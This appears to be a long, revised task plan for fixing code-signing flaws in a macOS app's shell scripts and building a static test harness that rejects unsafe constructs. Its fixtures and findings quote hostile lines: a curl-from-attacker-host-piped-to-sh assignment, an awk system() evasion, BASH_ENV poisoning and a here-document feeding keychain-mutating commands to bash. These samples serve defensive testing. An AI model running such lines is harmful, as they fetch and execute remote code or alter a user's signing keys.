tasks.objective: Close SEC-2, SEC-3 and ARCH-10 — the three findings that live entirely in `scripts/` — in one task, because they share four files and one of the two scripts sources the other. (a) SEC-2: `scripts/ensure-signing-identity.sh:56` calls `security set-key-partition-list -S apple-tool:,apple:,codesign: -s "$LOGIN_KEYCHAIN"`. `-s` is a predicate that takes no operand, so the keychain path is swallowed as a positional keychain argument and the command rewrites the partition list of EVERY signing private key in the login keychain, destroying `teamid:` partitions irreversibly. Bound the selection with `-l "$SIGNING_IDENTITY_NAME"`, keep the keychain as the trailing positional it already effectively is, and add a guard that refuses to run the command at all when the identity name is empty. v2 note: that guard was UNREACHABLE as v1 specified it, because `scripts/ensure-signing-identity.sh:16` assigns `SIGNING_IDENTITY_NAME="ClaudeStatusBar Local Signing"` unconditionally — no `${VAR:-default}`, no environment override — about forty lines above the call. v2 settles the interface: the name becomes overridable ONLY under `CSB_SIGNING_DRY_RUN=1`, never in a real build, so the guard is exercisable by the harness without opening a new way for the environment to redirect which CN is created or which label `-l` bounds. (b) SEC-3 + ARCH-10: `scripts/make-app.sh:80` signs with `--force --deep` and nothing else; the shipped artifact was measured at `flags=0x0(none)`, `TeamIdentifier=not set`, `(no entitlements)`, and honours `DYLD_INSERT_LIBRARIES`. Replace it with an inside-out signing sequence using `--options runtime --timestamp` and no `--deep`. (c) Build the differential harness both changes need: a sourceable indirection library `scripts/lib/signing-run.sh` that executes nothing at load time, routes every mutating command through one function, and PRINTS argv instead of executing when `CSB_SIGNING_DRY_RUN=1`; plus `scripts/signing-argv-test.sh` asserting on that argv AND on the indirection's default, wired into `make` and CI. The harness is why these are one task rather than two: split, it would be a hub file between a serialized pair.

THE PARSE IS PINNED BY THIS PLAN, not left to you: (1) join backslash-continued lines; (2) drop everything from an unquoted `#` to end of line; (3) SELECT THE COMMAND BY ITS EXECUTABLE TOKENS, NOT BY A SUBSTRING — v5 rewrites this step, because v4's `take the line containing the literal set-key-partition-list` is broken by this plan's OWN mandated text (spec-review-r4 finding F2 / codex C4): functional clause 3 requires the guard message `ensure-signing-identity: refusing to run set-key-partition-list with an empty identity name`, which CONTAINS that literal, sits EARLIER in the file than the command, survives step (2) because it is inside a quoted string rather than after an unquoted `#`, and carries no `security` token for step (4) to tokenise from. Criterion 3 remains STATIC; nothing in this note adds a criterion-3 assertion about the assignment's text, and clause 7(B1) is not weakened by it.

THE SIDE-EFFECT-FREE VALUE (`<SFV>`), new in v6. A word is an `<SFV>` if and only if its single- and double-quote spans balance AND it contains NONE of: a backtick, `$(`, `$((`, `<(`, `>(`, an unquoted `|`, `&`, `;`, `<`, `>`, `(`, `)`, `{` or `}`, or any `$`-expansion other than `$NAME`, `${NAME}`, `${NAME-word}` or `${NAME:-word}` where NAME matches `[A-Za-z_][A-Za-z0-9_]*` and `word` is itself an `<SFV>`. Everything else is NOT an `<SFV>`. WHY `<SFV>` STILL ADMITS `${NAME:-word}`, decided in v7 against round-6 finding F1's alternative: the colon form is genuinely side-effect-free, and it is REQUIRED elsewhere in this very plan — THE GUARD FORM pins the guard condition `[ -z "${SIGNING_IDENTITY_NAME:-}" ]` character-for-character, and forbidding `:-` inside `<SFV>` would make the mandated guard unwalkable. `<SFV>` is a test for ABSENCE OF EFFECT and must stay that; WHICH operator is correct at the identity-assignment site is a different question, about preserving an empty value, and it is decided by criterion 4's third conjunct at that one site. Narrow the site, not the grammar. This is a DENY-BY-DEFAULT test: the walker never reasons about whether a construct looks harmless, it refuses everything it cannot place in the list. v5 permitted item (v) with NO restriction on its right-hand side at all, so `LOGIN_KEYCHAIN="$(curl -s http://attacker/x | sh)"` fitted the enumeration exactly and executed above the guard without moving or deleting it (round-5 finding C2, CONFIRMED against the v5 text).

THE CONSTRUCT WALK, new in v6 and pinned with the same rigour criterion 1 gives its tokenisation (round-5 finding S1s, CONFIRMED). v5 said only that the harness `walks the resulting constructs in file order`, and criterion 1 step (2) — the routine it borrows — defines joining and comment-stripping but never how several physical lines become ONE construct, because its own target is a single command line. Item (iv-b) is a multi-line block, so the boundary rule decides both whether a compliant diff passes and whether an adversarial one does. The routine, in order: (1) READ the source as text. (2) NORMALISE: join backslash-continued lines exactly as criterion 1 step (2) joins them, keeping for each logical line the 1-based PHYSICAL line number it starts at. (3) STRIP: remove comments as criterion 1 step (2) removes them (a `#` beginning a word outside quotes starts a comment, to end of logical line) and drop whitespace-only logical lines; the line-number map survives the strip, so every message pinned below reports a physical line number. (4) GROUP: maintain a depth counter starting at 0. A logical line whose first word is `if` or `case` opens a block and increments depth; every later `if`/`case` in COMMAND POSITION (first word of a logical line, or first word after an unquoted `;`, `then`, `else`, `elif`, `do`, `&&`, `||` or `|`) increments it; each `fi`/`esac` in command position decrements it. A CONSTRUCT spans from a logical line beginning at depth 0 to the logical line at which depth returns to 0; a depth-0 logical line that opens nothing is a construct of one line. If the file ends at depth greater than 0, the walk FAILS with `unbalanced block opened at line N: the preamble walk cannot determine construct boundaries` and exits 1. It never guesses a boundary. (5) REFUSE THE UNCLASSIFIABLE, before classifying anything: any construct beginning before the guard that is not exactly one of (i)-(v) under the tests in step (6) is a FAILURE — including one the walker merely does not recognise. There is no `probably fine` branch. This inversion is what closes S1s's second failure mode: a `$(curl ...)` or an external command hidden inside item (iv-b)'s branches is rejected because the body test admits only the listed shapes, not because the walker went looking for a blacklist and happened to find it. (6) CLASSIFY. (iii) is a logical line whose normalised text is exactly `set -euo pipefail`. (iv-a) is a single logical line consisting of exactly one word of the form `SIGNING_IDENTITY_NAME=<SFV>`, with no command word before it and nothing after it. (v) is that same shape for `LOGIN_KEYCHAIN`. (iv-b) is a block from step (4) EVERY interior logical line of which is one of: `if <TEST>`, `then`, `elif <TEST>`, `else`, `fi`, `case <SFV> in`, a pattern line matching `<PATLINE>` (NEW IN v7, round-6 finding F2), `;;`, `esac`, or a single assignment `SIGNING_IDENTITY_NAME=<SFV>`; where `<TEST>` is a `[ ... ]`, `[[ ... ]]` or `test ...` conditional whose every operand is an `<SFV>` and which contains no `-a`/`-o`/`&&`/`||`-joined command and no `$(`.  `<PATLINE>` is a logical line consisting of an OPTIONAL leading `(`, then one or more patterns separated by `|`, then a terminating `)` and NOTHING after it except optional whitespace; and EVERY pattern in it must itself be an `<SFV>`. Before v7 this alternative read `a pattern line ending in `)`` — the sole SHAPE-ONLY alternative in a list whose every other member is bound to `<TEST>` or `<SFV>`, so `$(curl evil.sh|sh))` was a legal interior line of an item (iv-b) block: it ends in `)`. The `<SFV>` requirement is what closes that, and it closes it by the same deny-by-default test the rest of the walk uses rather than by a new blacklist. Any other interior line makes the construct NOT item (iv), and the walk fails with `preamble item (iv) rejected at line N: "<text>" is not an assignment of SIGNING_IDENTITY_NAME to a side-effect-free value` and exits 1. (7) The first construct that is not in (i)-(v) MUST be the guard AND MUST satisfy THE GUARD FORM below. On placement failure it prints `empty-identity guard is not the first executable construct: found <construct text> at line N before the guard at line M` — naming EVERY offending construct it found, not only the first — and exits 1.

THE GUARD FORM, new in v6, and it is the half of the safety gate v5 was missing (round-5 finding C1, CONFIRMED, graded S1-stop-the-line). v5's static routine established only WHERE the guard sits. A construct in the right place with an inverted condition, or with a diagnostic and no `exit`, passes a PLACEMENT check — and criterion 3 then launches the empty-name subprocess against exactly that tree. The subprocess walks past the non-refusing guard, `security find-certificate -c ""` matches nothing, the run ENTERS the creation branch and reaches `openssl req`, `openssl pkcs12 -export`, `security import ... -k "$LOGIN_KEYCHAIN"` and `security set-key-partition-list` against the operator's REAL login keychain. Placement was never the property the launch depended on; REFUSAL was, and v5 never checked it. So the walker validates the construct itself, deny-by-default. (g1) CONDITION — the guard is an `if` block whose condition is EXACTLY one of `[ -z "${SIGNING_IDENTITY_NAME:-}" ]`, `[ -z "${SIGNING_IDENTITY_NAME-}" ]`, `[[ -z "${SIGNING_IDENTITY_NAME:-}" ]]`, `[[ -z "${SIGNING_IDENTITY_NAME-}" ]]`, or `[ -z "$SIGNING_IDENTITY_NAME" ]` (this last is admissible only because `set -euo pipefail` is item (iii) above it and item (iv) has already assigned the variable). ANY other condition text fails with `empty-identity guard condition is not a recognised emptiness test: "<text>" at line N`. Polarity is never INFERRED: an inverted `-n` guard fails because it is not on the list, not because the walker reasoned about negation, and that is deliberate — a walker that reasons about negation is a walker that can be argued with. (g2) BODY — the true branch is exactly two logical lines, in this order: the diagnostic `echo "ensure-signing-identity: refusing to run set-key-partition-list with an empty identity name" >&2`, message matched character-for-character against the string this clause pins and the redirection to fd 2 required; then `exit <N>` with N an integer literal in 1-255. `return` FAILS (the file is sourced by `scripts/make-app.sh:79`, so `return` in a sourced script continues the caller). A BARE `exit` FAILS, and the reason is pinned here so nobody re-litigates it: bare `exit` exits with the status of the last command, which after a successful `echo` is 0 — a guard that prints the refusal and exits 0 is a guard that does not refuse. (g3) SHAPE — no `else`, no `elif`, nothing between the condition and the diagnostic, and no other statement inside the block. On any (g1)-(g3) failure the harness prints `empty-identity guard is present but cannot refuse: <reason> at line N`, exits 1, AND LAUNCHES NO SUBPROCESS. Under the hypothesis, placement and form both passing, it prints `ok: empty identity guard is the first executable construct and refuses` and exits 0.

THE CLEAN LAUNCH, new in v6 (round-5 finding C2, second half, CONFIRMED). A static proof about the FILE says nothing about what bash runs BEFORE the file. For a non-interactive shell, `$BASH_ENV` names a file bash sources first, and exported shell functions arrive through the environment as `BASH_FUNC_name%%` and can shadow a command the script calls. Neither is visible to ANY walk of the script's own text, and neither requires moving or deleting the guard, so neither is closed by anything above. Therefore every subprocess this task's harness launches — both of them, enumerated in functional clause 7(B) — is launched with an EXPLICITLY CONSTRUCTED environment rather than an inherited one: `env -i HOME="$HOME" PATH="$PATH" TMPDIR="${TMPDIR:-/tmp}" <the case's own CSB_ variables> /bin/bash <script>`. `env -i` is what makes this checkable, because it starts from an EMPTY environment: no `BASH_ENV`, no `ENV`, no `SHELLOPTS`, no `BASH_FUNC_*` survives by being forgotten. The allowlist above is the WHOLE environment the child receives, and `HOME` is on it because item (v) reads it. A harness that instead unsets a blacklist of known-bad names is NOT compliant, because the blacklist is the thing that goes stale. STATIC ASSERTION, case name `harness-launcher-is-clean`: every occurrence of `bash` as a command word in `scripts/signing-argv-test.sh` is preceded on the same logical line by that `env -i` prefix. NULL `harness launches bash without env -i at line N: shell startup files and exported functions can execute before the guard`, exit 1. HYPOTHESIS `ok: every harness subprocess is launched with a constructed environment`, exit 0. RESIDUAL, stated rather than papered over: this pins the CHILD's environment. The harness's OWN environment comes from whoever runs `make signing-test`, and no clause of this plan can constrain that; what the plan can do is guarantee the harness never passes a poisoned environment on, and that is what this assertion checks. CORRECTED IN v13 (round-17 finding S2-5, graded S2-major): the assertion above tests that a `env -i` prefix is PRESENT and tests nothing about its CONTENTS, so `env -i BASH_ENV=/tmp/x HOME=$HOME PATH=$PATH bash scripts/ensure-signing-identity.sh` satisfies `harness-launcher-is-clean` while carrying in the exact poison THE CLEAN LAUNCH exists to exclude, and a matcher that finds no `bash` at all passes it vacuously. Three clauses replace that single test and ALL THREE must hold. (c1) THE HARNESS FILE SET, pinned ONCE here and referenced by name from everywhere else in this criterion: `scripts/signing-argv-test.sh`, `scripts/lib/signing-run.sh`, and the `signing-test` target of `Makefile` — three files, and nothing else. Every assertion in this criterion that says THE HARNESS FILE SET means exactly those; a fourth file joining the harness is a `spec-change-proposed` that names it here rather than a silent widening of a scan set. (c2) THE CENSUS IS ITSELF ASSERTED, BEFORE ANYTHING IS ASSERTED ABOUT IT: collect every occurrence of `bash`, `sh` or `zsh` in EXECUTABLE POSITION across THE HARNESS FILE SET under THE COMMAND-WORD SPELLING RULE pinned in EXECUTABLE POSITION vs INERT DATA below, and assert the census is NON-EMPTY. A census of zero is a FAILURE, not a vacuous pass: report `Expectation failed: harness-launcher-is-clean found 0 shell command words across the harness file set: the matcher is broken, not the harness clean` and exit 1, because a matcher that finds nothing passes a poisoned harness in silence and that is the failure mode this criterion is built against. (c3) THE PREFIX IS A CLOSED ALLOWLIST, DENY BY DEFAULT: for each occurrence the census returned, the text between `env -i` and the command word must consist ONLY of variable assignments whose names are drawn from `HOME`, `PATH`, `TMPDIR`, `CSB_SIGNING_DRY_RUN`, `CSB_SIGNING_IDENTITY_NAME` — in any order, at most one assignment per name — and of `env` options that do not re-import the environment (`-u`/`--unset` of an allowlisted name is permitted; `-` alone, `-i` repeated and `--` are permitted; anything that adds a name back is not). ANY other assignment name FAILS, and any assignment name the matcher cannot resolve to a literal FAILS by UNRESOLVED IS A FAILURE, NOT A NON-MATCH below. HYPOTHESIS text on a pass: `ok: harness-launcher-is-clean: <N> shell launches across the harness file set, each env -i with an allowlisted prefix`. NULL, which is DIFFERENT TEXT and not a different value inside the same text: `Expectation failed: harness-launcher-is-clean: <file>:<line> passes non-allowlisted variable <NAME> through env -i: a poisoned environment reaches the guarded subprocess`. THE NEGATIVE THAT PROVES (c3) CAN SAY NO is F-10 `poisoned-clean-launch`, new in v13 in THE FIXTURE SET below, which carries a `BASH_ENV` assignment inside the prefix and MUST make (c3) report that null naming `BASH_ENV`; the positive is F+1 `self-source`, which must PASS all three clauses. An assertion whose negative fixture is absent is an assertion nobody has watched refuse (`lesson-raised-cbdae7931913`), and v6's version of this assertion had none.

THE FIXTURE RULE, new in v5 (spec-review-r4 findings F1 and F4), EXTENDED in v6 (round-5 findings C1, C2, S1s). Every NULL of this criterion is demonstrated from a SOURCE FIXTURE: a copy of `scripts/ensure-signing-identity.sh` written into a directory made by `$(mktemp -d)`, mutated as the table below says, parsed by the SAME static routine, and deleted afterwards. A FIXTURE IS NEVER EXECUTED — not with `bash`, not with `source`, not with `sh -n`, not under any value of `CSB_SIGNING_DRY_RUN`, and never copied back over the real script. NO FIXTURE, IN THIS CRITERION OR ANY OTHER, IS EVER HANDED TO A SHELL BY ANYTHING. WHAT THE HARNESS MAY HAND TO BASH, corrected in v6 (round-5 finding C3, CONFIRMED): v5 wrote `the only path this harness ever hands to bash is the real scripts/ensure-signing-identity.sh`, which contradicted criterion 5(e) — that subcase invokes `bash scripts/make-app.sh` from the same harness — outright. That sentence is REPLACED, not reinterpreted. The harness may launch exactly the two subprocesses enumerated in functional clause 7(B), each only after ITS own prerequisites: THIS criterion's `empty-identity-refused` case hands bash exactly one path, the real `scripts/ensure-signing-identity.sh`, and only after placement, guard form and clean-launch assertions have all passed; criterion 5(e) hands bash the real `scripts/make-app.sh` under the separate prerequisites 5(e) pins. Nothing else, ever. IMPLEMENTATION NOTE, because it bears on the diff cap: the fixtures below are ROWS IN ONE TABLE driven by ONE loop in `scripts/signing-argv-test.sh` — a mutation and an expected string per row — not nine hand-written cases. A fixture that pins a line number this same plan shifts fails for the wrong reason and teaches the worker to loosen the assertion. Locate the probe by CONTENT (the first logical line whose normalised text begins `if ! security find-certificate`), not by ordinal. (N3) SILENT STATEMENT BEFORE THE GUARD — insert the single line `: csb-fixture-silent-statement` (a no-op with no output and no side effect, which is exactly the shape a line-number check cannot see) between the `LOGIN_KEYCHAIN` assignment and the guard; expected `empty-identity guard is not the first executable construct: found ": csb-fixture-silent-statement" at line N before the guard at line M` and exit 1. N3 is the discriminating fixture for PLACEMENT: v4's line-number comparison PASSES it and the v5 assertion FAILS it, so an implementation that reports N3 as passing has shipped the v4 check under a v5 name. (N4) INVERTED CONDITION, new in v6 — replace the guard's condition with `[ -n "${SIGNING_IDENTITY_NAME:-}" ]`, changing nothing else; expected `empty-identity guard condition is not a recognised emptiness test: "[ -n "${SIGNING_IDENTITY_NAME:-}" ]" at line N` and exit 1. (N5) DIAGNOSTIC WITHOUT EXIT, new in v6, RE-PHRASED IN v7 (round-6 finding F5) — delete THE GUARD'S EXIT STATEMENT, whatever integer code it carries: THE GUARD FORM (g2) admits `exit <N>` for any N in 1-255, so a fixture instructed to `delete the `exit 1`` is unbuildable against a compliant diff that legally shipped `exit 2`. Locate the statement as the last logical line of the guard's true branch and delete it, leaving the `echo` and the correct condition in the correct place; expected `empty-identity guard is present but cannot refuse: true branch does not end in a non-zero exit at line N` and exit 1. An implementation that reports N4 or N5 as passing has shipped the v5 gate under a v6 name. (N6) EXIT ZERO, new in v6, RE-PHRASED IN v7 (round-6 finding F5) — replace the guard's exit statement, whatever its integer code, with a bare `exit`; expected `empty-identity guard is present but cannot refuse: bare exit returns the status of the preceding echo, which is 0, at line N` and exit 1. (N7) EFFECTFUL PREAMBLE, new in v6 — replace the `LOGIN_KEYCHAIN` assignment with `LOGIN_KEYCHAIN="$(echo $HOME/Library/Keychains/login.keychain-db)"`, which is item (v) under v5's unrestricted wording and a command substitution executing above the guard under v6's; expected `unsupported shell syntax at line Q: "LOGIN_KEYCHAIN="$(echo $HOME/Library/Keychains/login.keychain-db)"" is not a side-effect-free value` and exit 1, where Q is the line number the harness OBSERVES and is matched as an integer. CORRECTED IN v7 (round-6 finding F5): v6 wrote `at line 17`, which is the assignment's position in the UNMODIFIED file; clause 2's multi-line replacement of line 16 moves it. Build the fixture by locating the `LOGIN_KEYCHAIN` assignment BY CONTENT (preamble item (v), wherever it now sits) and replacing it there. (N8) HIDDEN COMMAND IN THE TWO-BRANCH BODY, new in v6 and the fixture S1s's second failure mode demands — inside the item (iv-b) `if`/`else` block, add the line `SIGNING_IDENTITY_NAME="$(cat /etc/hostname)"` to one branch, so the construct still assigns only `SIGNING_IDENTITY_NAME` and still looks like item (iv) to a walker that groups blocks but does not test their bodies; expected `preamble item (iv) rejected at line N: "SIGNING_IDENTITY_NAME="$(cat /etc/hostname)"" is not an assignment of SIGNING_IDENTITY_NAME to a side-effect-free value` and exit 1. This is the same pinned-placement-plus-form idiom criterion 5(e) uses for `make-app.sh`, and it is here for the same reason: a guard that is in the file but in the wrong place is not a guard, and a guard in the right place that cannot refuse is not a guard either.

FIXTURE ANCHORING RULE, NEW IN v7 (round-6 finding F5), and it governs EVERY mutation fixture in this criterion and in criterion 5, not only the four v7 re-phrased. (1) A fixture is built by locating its target construct BY CONTENT — the guard, the guard's exit statement, the `LOGIN_KEYCHAIN` assignment, the `find-certificate` probe — and mutating it in place. Never by seeking a line ordinal, and never by assuming a literal the grammar does not require. (2) Every line number inside an expected message is a SYMBOL (N, M, P, Q) matched as an integer, never a pinned literal. (3) If a fixture instruction cannot be carried out against a compliant diff, that is a `spec-change-proposed`, not licence to loosen the assertion the fixture is testing. WHY: v6 broke this rule in both directions at once. N5, N6 and M2 said `delete/replace the `exit 1`` while THE GUARD FORM (g2) admits `exit <N>` for N in 1-255, so a worker who legally shipped `exit 2` had no `exit 1` to delete; and N2 pinned line 23 and N7 pinned line 17 of a file that functional clause 2's own multi-line replacement of line 16 SHIFTS. A fixture that fails for the wrong reason is worse than a missing fixture, because it teaches the worker to weaken the assertion until the fixture passes.

THE STATIC-ASSERTION FIXTURE RULE, NEW IN v9, AND IT BINDS EVERY STATIC ASSERTION IN THIS TASK (round-9 findings CODEX-F1, CODEX-F4 and SONNET-F1 are three instances of ONE class; this paragraph fixes the class, and the per-assertion paragraphs fix the instances). Round 8 closed nine coverage gaps the same way — by adding a static text assertion — and round 9 proved that a static text assertion fails in TWO directions at once, and that v8 shipped both. OVER-REJECTION: a harness that must CONTAIN the string `security set-key-partition-list` in order to test that the command is never run is failed by its own inventory; a signing line followed by `|| { echo "timestamped signing failed" >&2; exit 1; }` fails loudly, performs no fallback, satisfies nonfunctional clause 6, and is rejected solely for containing `||`. UNDER-DETECTION: `SIGN_FLAGS=(--force --deep --sign "$SIGNING_IDENTITY_NAME" --options runtime --timestamp)` followed by `codesign "${SIGN_FLAGS[@]}"` contains none of the literal tokens criteria 8 and 9 look for, because criterion 1's pinned parse routine joins continuations, strips comments and tokenises literal text but NEVER RESOLVES A VARIABLE OR AN ARRAY EXPANSION, so `--deep` and an unguarded `--timestamp` ship live while both checks print their ok text and exit 0. Therefore every static assertion in this task owes THREE things, and an assertion carrying fewer than three is INCOMPLETE rather than merely terse: (1) a POSITIVE FIXTURE it must PASS, including the awkward compliant cases; (2) a NEGATIVE FIXTURE it must FAIL, in the NON-LITERAL shape as well as the literal one; (3) a DISCLOSED RESIDUAL, one plain sentence saying what the check cannot see, in the register THE CLEAN LAUNCH already uses, ending in the plan's standing formula that a diff needing a run-time-assembled form is a `spec-change-proposed`, not a judgement call.

EXECUTABLE POSITION vs INERT DATA — pinned ONCE here, used by THE CONSTRUCT WALK, THE GUARD FORM, THE CLEAN LAUNCH, THE HARNESS INVOCATION INVENTORY, criterion 1, criterion 2, criterion 8's STATIC HALF and criterion 9's STATIC HALF, so that the eight of them cannot drift apart (v11 corrects v10's `six`, which stood over the EIGHT consumers just enumerated — round-13 finding CODEX-R13-F3, S4-nit/maintainability; the phrase was byte-identical in v9 and v10, so note P10-3's claim to have swept this class did not in fact cover it, and v11 re-swept task-1 for bare count-words rather than trusting that claim a second time). After criterion 1's normalise-and-strip routine has joined continuations and removed comments, a word occurrence is in an EXECUTABLE POSITION if and only if: (p1) it is the COMMAND WORD of a simple command — the first word of the logical line, or the first word after `;`, `&&`, `||`, `|`, `(`, `{`, `then`, `else`, `elif`, `do`, or after one or more `NAME=value` prefixes; or (p2) it is ANY word of a simple command whose command word is one of the EXECUTION PASSTHROUGHS `eval`, `exec`, `command`, `env`, `xargs`, `sudo`, `sh`, `bash`, `zsh`, `source`, `.`, or `time`; or (p3) it appears in the body of an UNQUOTED here-document (`<<EOF`, `<<-EOF`), whose contents the shell expands. EVERY OTHER OCCURRENCE IS INERT DATA and fails no assertion in this task: a word inside a single- or double-quoted string that is an argument to a command word which is not an execution passthrough (`grep`, `printf`, `echo`, `cat`, `case`, `[[`, `test`, `awk`, `sed`); the body of a QUOTED here-document (`<<'EOF'`); and a `readonly` variable's value, tracked as below. This is the distinction CODEX-F1 showed v8 did not draw: v8 said `a banned token inside a comment is not a failure and a banned token inside a string literal IS one`, which fails the harness for carrying the source text needed to test the prohibition. That sentence is SUPERSEDED by this paragraph wherever the two disagree. CORRECTED IN v13 (round-17 finding S2-6, graded S2-major): `awk` and `sed` are STRUCK from the inert-side list above. They are not read-only text tools that happen to take a program — they are INTERPRETERS, and an interpreter that executes one of its arguments puts that argument in EXECUTABLE POSITION; `awk 'BEGIN{system("security import ...")}'` and `sed` with a `w`/`e` command are the concrete evasions, and v12 classified both as inert data. AND (p2) IS A CLASS, NOT A ROSTER: (p2) covers EVERY command word that executes an argument, a standard-input stream or a named file as code, and `eval`, `exec`, `command`, `env`, `xargs`, `sudo`, `sh`, `bash`, `zsh`, `source`, `.`, `time`, `awk`, `sed`, `perl`, `python3`, `ruby`, `osascript` and `find` with `-exec`/`-execdir` are INSTANCES of that class, not its definition. A command word the matcher cannot classify DEFAULTS TO PASSTHROUGH — it is treated as (p2) and its arguments are walked — because the failure mode of a roster is that the next interpreter someone reaches for is not on it, and defaulting the other way makes the omission silent. AND THE COMMAND-WORD SPELLING RULE, pinned ONCE here and binding EVERY assertion in this criterion that names a command word — THE CONSTRUCT WALK, THE GUARD FORM, THE CLEAN LAUNCH clauses (c2) and (c3), and inventory clauses (h1) through (h5): a command word matches a name when the BASENAME of the word equals that name, so `bash`, `/bin/bash` and the `bash` that `env`'s passthrough yields are ONE word, and `security` and `/usr/bin/security` are one word. A matcher that compares the whole word is a matcher a coder evades by writing an absolute path. Quoting does not change a basename (`"/bin/bash"` is `bash`); a command word that cannot be reduced to a literal basename — because it is a variable, a substitution or an assembled string — is UNRESOLVED and falls to UNRESOLVED IS A FAILURE, NOT A NON-MATCH below, which fails rather than skips. CORRECTED IN v14 (round-19 finding R1, graded S2-major): THE POSITION RULE IS WIDENED TO COVER REDIRECTION, and it is the (p1)-(p3) enumeration that was wrong, not the passthrough roster. As written above, (p2) reaches only a WORD of a simple command and (p3) only an UNQUOTED here-document, so a quoted here-document body redirected into an interpreter -- `bash <<'EOF'` ... `EOF` -- satisfies NEITHER: the body is not a word of the simple command (it is the command's INPUT STREAM), and the single-quoting excludes it from (p3) by construction. The construct walk therefore classified it INERT while the interpreter executed every line of it, so a production `scripts/ensure-signing-identity.sh` carrying a mutating `security` subcommand against the login keychain inside such a body is reported CLEAN by this harness -- the exact SEC-2 mutation this epic exists to remove, passing the assertion written to catch it. Adding `bash` to the EXECUTION PASSTHROUGHS does not close this, because `bash` is already on that list: the defect is about WHAT COUNTS AS A POSITION, not about which command words are passthroughs. THE RE-DERIVED POSITION RULE, AND THE DERIVATION IS THE THING TO TRUST, NOT THE CLAUSE NUMERALS: an occurrence -- a WORD occurrence as before, or a LINE occurrence, which is new -- is in an EXECUTABLE POSITION if and only if it satisfies (p1), (p2) or (p3) as written above, OR (p4), NEW IN v14: it is a line of TEXT DELIVERED TO AN INTERPRETER BY REDIRECTION OR PIPE. (p4) holds for the body of a here-document WHETHER QUOTED (`<<'EOF'`) OR UNQUOTED (`<<EOF`, `<<-EOF`); for the operand of a here-string (`<<<`); for a literal or a command substitution piped into the command (`printf '...' | bash`, `cat fixture | sh`); and for a file delivered as the interpreter's script operand or as a process substitution (`bash <(...)`). In every one of those cases the delivered text is SPLIT INTO LOGICAL LINES BY criterion 1's normalise-and-strip routine AND WALKED AS COMMANDS -- same tokenisation, same guard form, same assertions, and the same UNRESOLVED IS A FAILURE, NOT A NON-MATCH treatment -- exactly as (p2) walks the words of a passthrough. THE TARGET TEST, WHICH IS WHAT KEEPS (p4) FROM SWALLOWING THE HARNESS'S OWN FIXTURES: (p4) fires IF AND ONLY IF the RECEIVING command word is a passthrough under (p2) -- an instance of that class, resolved by THE COMMAND-WORD SPELLING RULE's basename comparison, so that `sudo bash <<'EOF'` and `env bash <<'EOF'` resolve through the passthrough chain to `bash`, and so that a receiving command word the matcher CANNOT classify DEFAULTS TO PASSTHROUGH and its delivered text is walked. A here-document whose redirection target is NOT a passthrough -- `cat > "$dir/fixture.sh" <<'EOF'`, a `tee`, or a plain file redirection -- REMAINS INERT DATA and fails nothing. That sentence is load-bearing: it is why THE FIXTURE RULE, THE FIXTURE ANCHORING RULE, THE STATIC-ASSERTION FIXTURE RULE, SELF-MATCH IS NOT A VIOLATION and every fixture in THE FIXTURE SET FOR THIS TASK are UNAFFECTED by this widening -- those fixtures are written by a QUOTED here-document into `$(mktemp -d)`, their receiving command word is `cat`, and they are NEVER EXECUTED, so they stay inert for the same reason they were always inert. CONSEQUENTLY THE INERT-SIDE ENUMERATION ABOVE IS RE-DERIVED RATHER THAN PATCHED: its entry `the body of a QUOTED here-document (<<'EOF'>)` is inert ONLY under the target test -- inert when the receiving word is not a passthrough, EXECUTABLE when it is -- and where that entry and this paragraph disagree, THIS PARAGRAPH GOVERNS. THIS IS ROUND-17 FINDING S2-6 READ FROM THE OTHER SIDE, and this plan records that rather than treating R1 as new: S2-6 (graded S2-major, repaired in v13) was program text reaching an interpreter as an ARGUMENT (`awk 'BEGIN{system("security import ...")}'`); R1 is program text reaching an interpreter as a STREAM. One hole, two faces, and the position rule now covers both -- which is what v13's own class sentence already PROMISED when it said (p2) covers every command word that executes `an argument, a standard-input stream or a named file as code`. A sweep of this plan finds `standard-input` occurring EXACTLY ONCE, in that promise, and `stdin` and `standard input` not at all: the promise was made in v13 and the (p1)-(p3) enumeration never implemented it. v14 makes the enumeration match the sentence. THE NULLS FOR (p4), demonstrated from SOURCE FIXTURES under THE FIXTURE RULE and THE FIXTURE ANCHORING RULE unchanged, and NEITHER FIXTURE IS EVER EXECUTED -- the harness reads both as text: (n1) POSITIVE -- a copy of `scripts/ensure-signing-identity.sh` into which a construct `bash <<'EOF'` / a line invoking `security` with a mutating subcommand against the login keychain / `EOF` has been inserted below the guard. The harness MUST FAIL, and its message MUST name the delivery: `SEC-2 executable position via redirection at <fixture>:<line-of-the-redirection>, line <k> of the here-document delivered to command word `bash`, banned command word `security` with mutating subcommand <name>`. (n2) NEGATIVE, AND IT IS THE NULL THAT MAKES (n1) MEAN SOMETHING -- the SAME inserted text, byte for byte, with the receiving construct changed to `cat > "$dir/captured.txt" <<'EOF'`. The harness MUST PASS and MUST emit NO finding for that construct. The two outputs are required to differ in exactly this way: under the hypothesis the harness prints the `SEC-2 executable position via redirection` line naming `bash` and the here-document line number; under the null it prints nothing about that construct at all. A harness that reports the same text for (n1) and (n2) has not implemented (p4) and FAILS this criterion. CORRECTED IN v15 (round-21 finding R1, graded S2-major): THE TARGET TEST IS BOUNDED TO QUOTED HERE-DOCUMENTS, and this correction names BOTH clauses it arbitrates so that neither reading survives as an alternative. As written above, (p3) makes the body of an UNQUOTED here-document (`<<EOF`, `<<-EOF`) EXECUTABLE with NO condition on the receiving command word, while the exemption sentence -- `A here-document whose redirection target is NOT a passthrough ... REMAINS INERT DATA and fails nothing` -- is unqualified as to QUOTING; for `cat > "$dir/f.sh" <<EOF` the two demand OPPOSITE verdicts inside this one paragraph, which the precedence clause above does not reach because that clause arbitrates only the inert-side enumeration's QUOTED here-document entry. THE RULE THAT GOVERNS, AND IT IS THE ONLY ONE: (a) the body of an UNQUOTED here-document is in EXECUTABLE POSITION under (p3) WHATEVER ITS REDIRECTION TARGET -- `cat`, `tee`, a plain file redirection, a `$(mktemp -d)` path or a passthrough alike -- because the shell performs parameter expansion, command substitution and arithmetic expansion on that body BEFORE any redirection delivers it, so the substitution runs no matter who receives the result; (b) THE TARGET TEST AND THE EXEMPTION SENTENCE BOUND (p4), WHICH IS THE CLAUSE THEY WERE WRITTEN FOR, AND THEY GOVERN THE BODY OF A QUOTED HERE-DOCUMENT (`<<'EOF'`, `<<"EOF"`) AND NOTHING ELSE -- a quoted body is EXECUTABLE when its receiving command word is a passthrough under (p2) and INERT when it is not; THEY DO NOT BOUND (p3); (c) the exemption therefore does NOT exempt an unquoted here-document, a here-string (`<<<`), a literal or substitution piped into an interpreter, or a process substitution -- those stay governed by (p3) and (p4) exactly as written above and are UNAFFECTED by this correction. AND 